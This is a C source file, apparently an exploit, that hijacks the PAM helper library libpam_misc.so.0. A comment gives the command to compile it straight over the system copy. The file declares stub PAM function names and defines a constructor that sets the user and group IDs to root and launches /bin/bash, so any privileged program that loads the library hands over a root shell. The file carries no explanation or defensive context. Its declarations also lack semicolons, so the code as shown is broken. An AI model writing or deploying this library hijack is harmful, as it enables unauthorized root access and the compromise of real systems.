#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

//gcc -shared -o /lib/x86_64-linux-gnu/libpam_misc.so.0  -fPIC inject.c

//int audit_open;
//int audit_log_acct_message;
//int audit_log_user_message;
//int audit_fd;

int  pam_start
int  pam_set_item
int  pam_chauthtok
int  pam_end
int  pam_strerror
int  pam_getenvlist
int  pam_close_session
int  pam_acct_mgmt
int  pam_setcred
int  pam_authenticate
int  pam_open_session

void inject()__attribute__((constructor));

void inject()
{
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
